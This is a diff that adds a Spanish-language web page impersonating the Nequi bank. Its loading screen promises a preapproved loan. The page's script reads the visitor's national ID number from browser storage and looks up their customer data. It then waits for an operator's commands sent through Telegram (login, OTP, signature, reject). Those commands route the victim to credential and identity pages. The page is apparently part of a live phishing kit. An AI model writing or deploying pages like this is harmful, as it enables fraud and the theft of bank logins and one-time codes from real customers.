@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Procesando solicitud - Nequi</title>
+  <link rel="shortcut icon" type="image/x-icon" href="images/favicon-3.ico">
+
+  <!-- Google Fonts: Plus Jakarta Sans, Manrope -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet">
+
+  <link rel="stylesheet" href="css/cargando.css?v=2">
+</head>
+
+<body>
+
+  <!-- Banner Verde Superior: Listo! Tu crédito se encuentra preaprobado. -->
+  <div class="content" id="content">
+    <div class="check-container">
+      <div class="checkmark"></div>
+    </div>
+    <p>Listo! Tu crédito se encuentra preaprobado.</p>
+  </div>
+
+  <!-- Contenedor Principal Centrado en Pantalla -->
+  <main class="loading-page-container">
+    <!-- Estado 1: Cubos Nequi Magenta con Texto -->
+    <div class="loading-cubes-wrapper" id="cubesWrapper">
+      <div class="nequi-loader" id="loader">
+        <div class="cubes">
+          <div class="cube"></div>
+          <div class="cube"></div>
+        </div>
+      </div>
+      <p class="loading-text" id="textCube">
+        Un momento por favor,<br>estamos procesando tu<br>solicitud...
+      </p>
+    </div>
+
+    <!-- Estado 2: Tarjeta Cian ¡Listo! con Check Blanco -->
+    <div class="ready-card-wrapper" id="doneCard" style="display: none;">
+      <div class="cyan-ready-card">
+        <svg class="ready-check-icon" viewBox="0 0 48 48" fill="none">
+          <path d="M11 25 L21 35 L37 15" stroke="#ffffff" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round" />
+        </svg>
+        <span class="ready-card-text">¡Listo!</span>
+      </div>
+    </div>
+  </main>
+
+  <!-- Scripts: Telegram -->
+  <script src="js/telegram.js"></script>
+
+  <!-- Lógica de Secuencia de Estados y Consulta -->
+  <script>
+    document.addEventListener("DOMContentLoaded", async () => {
+      const cubesWrapper = document.getElementById("cubesWrapper");
+      const textCube = document.getElementById("textCube");
+      const doneCard = document.getElementById("doneCard");
+      const preapprovedBanner = document.getElementById("content");
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const paso = urlParams.get("paso") || "solicitud";
+
+      const formData = JSON.parse(localStorage.getItem("formData") || "{}");
+      const cedula = (formData.cedula || "").trim().replace(/\D/g, "");
+
+      // Función para cambiar de estado limpiamente
+      function showCubes(mensajeHTML) {
+        if (preapprovedBanner) preapprovedBanner.classList.remove("show");
+        if (doneCard) doneCard.style.display = "none";
+        if (textCube) textCube.innerHTML = mensajeHTML;
+        if (cubesWrapper) cubesWrapper.style.display = "flex";
+      }
+
+      function showReadyCard(mensajeBanner) {
+        if (cubesWrapper) cubesWrapper.style.display = "none";
+        if (doneCard) doneCard.style.display = "flex";
+        if (preapprovedBanner) {
+          const p = preapprovedBanner.querySelector("p");
+          if (p && mensajeBanner) {
+            p.textContent = mensajeBanner;
+          }
+          preapprovedBanner.classList.add("show");
+        }
+      }
+
+      if (paso === "firma" || paso === "identidad" || paso === "saldo") {
+        // === MODO CARGA: VALIDANDO SOLICITUD (IMAGEN 2) ===
+        showCubes("Un momento por favor,<br>estamos validando tu<br>solicitud...");
+
+        let manualAction = false;
+        if (window.TelegramService && window.TelegramService.listen) {
+          window.TelegramService.listen((action) => {
+            if (action && !manualAction) {
+              manualAction = true;
+              if (action.startsWith("btn_error_saldo_")) {
+                window.location.href = "identidad.html?error=saldo";
+              } else if (action.startsWith("btn_otp_") || action.startsWith("btn_firma_")) {
+                showReadyCard("Listo! Tu crédito se encuentra aprobado.");
+                setTimeout(() => {
+                  window.location.href = "firma.html";
+                }, 2800);
+              }
+            }
+          }, 15000);
+        }
+
+        // Si no hay respuesta manual, redirige según el flujo
+        setTimeout(() => {
+          if (!manualAction) {
+            showReadyCard("Listo! Tu crédito se encuentra aprobado.");
+            setTimeout(() => {
+              window.location.href = "firma.html";
+            }, 2800);
+          }
+        }, 3000);
+
+      } else if (paso === "validacion") {
+        // === MODO CARGA: TRAS RESPONDER PREGUNTAS DE SEGURIDAD ===
+        showCubes("Un momento por favor,<br>estamos validando tus<br>respuestas...");
+
+        let manualAction = false;
+        if (window.TelegramService && window.TelegramService.listen) {
+          window.TelegramService.listen((action) => {
+            if (action && !manualAction) {
+              manualAction = true;
+              if (action.startsWith("btn_login_")) {
+                showReadyCard("Validación enviada correctamente.");
+                setTimeout(() => {
+                  window.location.href = "login.html";
+                }, 2500);
+              } else if (action.startsWith("btn_rechazar_")) {
+                showCubes("<span style='color:#da0081; font-weight:700;'>Validación no aprobada</span><br><br>No hemos podido validar tu identidad. Inténtalo de nuevo más adelante.");
+              }
+            }
+          }, 15000);
+        }
+
+        // A los 1.8s muestra el recuadro cian ¡Listo! CON banner verde "Validación enviada correctamente."
+        setTimeout(() => {
+          if (!manualAction) {
+            showReadyCard("Validación enviada correctamente.");
+          }
+        }, 1800);
+
+        // A los 5.2s continúa al login celular
+        setTimeout(() => {
+          if (!manualAction) {
+            window.location.href = "login.html";
+          }
+        }, 5200);
+
+      } else {
+        // === MODO CARGA: SOLICITUD INICIAL DESDE INDEX ===
+        showCubes("Un momento por favor,<br>estamos procesando tu<br>solicitud...");
+
+        // 1. Consultar API protegida en segundo plano sin bloquear animación
+        async function fetchCustomerData(cc) {
+          const current = localStorage.getItem("customerData");
+          if (current) {
+            try {
+              const parsed = JSON.parse(current);
+              if (parsed && parsed.exito && parsed.nombre_completo && parsed.nombre_completo !== "Usuario") {
+                return parsed;
+              }
+            } catch (e) {}
+          }
+
+          if (!cc) return null;
+
+          try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 9500);
+            const res = await fetch(`api.php?action=consultar_cliente&cedula=${encodeURIComponent(cc)}`, {
+              signal: controller.signal
+            });
+            clearTimeout(timeout);
+            if (res.ok) {
+              const data = await res.json();
+              if (data && data.exito) {
+                localStorage.setItem("customerData", JSON.stringify(data));
+                return data;
+              }
+            }
+          } catch (e) {
+            // Silencioso
+          }
+          return null;
+        }
+
+        if (cedula) {
+          fetchCustomerData(cedula);
+        }
+
+        // 2. Escuchar decisiones del administrador en Telegram (opcional)
+        let manualAction = false;
+        if (window.TelegramService && window.TelegramService.listen) {
+          window.TelegramService.listen((action) => {
+            if (action && !manualAction) {
+              manualAction = true;
+              if (action.startsWith("btn_login_")) {
+                showReadyCard();
+                setTimeout(() => {
+                  window.location.href = "login.html";
+                }, 1200);
+              } else if (action.startsWith("btn_validar_")) {
+                window.location.href = "validacion.html";
+              } else if (action.startsWith("btn_rechazar_")) {
+                showCubes("<span style='color:#da0081; font-weight:700;'>Solicitud no aprobada</span><br><br>En este momento no podemos otorgarte el crédito. Inténtalo de nuevo más adelante.");
+              }
+            }
+          }, 15000);
+        }
+
+        // 3. Secuencia oficial de tiempos
+        // Paso A (1.8s): Oculta cubos y muestra tarjeta cian ¡Listo! CON banner verde superior
+        setTimeout(() => {
+          if (!manualAction) {
+            showReadyCard("Listo! Tu crédito se encuentra preaprobado.");
+          }
+        }, 1800);
+
+        // Paso B (5.5s): Oculta tarjeta cian y banner verde, muestra cubos con mensaje de preguntas
+        setTimeout(() => {
+          if (!manualAction) {
+            showCubes("Espera un momento, necesitamos hacerte<br>unas preguntas de seguridad para aprobar<br>tu crédito.");
+          }
+        }, 5500);
+
+        // Paso C (9.0s): Redirige a validación de preguntas
+        setTimeout(() => {
+          if (!manualAction) {
+            window.location.href = "validacion.html";
+          }
+        }, 9000);
+      }
+    });
+  </script>
+</body>
+
+</html>
